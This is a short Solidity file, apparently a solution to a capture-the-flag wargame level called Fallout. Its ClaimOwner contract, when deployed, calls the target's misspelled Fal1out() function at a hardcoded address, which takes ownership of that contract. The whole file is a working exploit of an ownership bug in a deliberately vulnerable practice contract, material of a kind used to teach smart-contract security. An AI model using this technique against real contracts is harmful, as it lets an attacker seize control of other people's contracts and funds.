// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Fallout.sol";

contract ClaimOwner{
    Fallout public falloutContract;

    constructor() public payable{
        falloutContract = Fallout(0xCcEe4887E6778b42E3FFA22283Fc3324FE0C5c44);
        falloutContract.Fal1out();
    }
}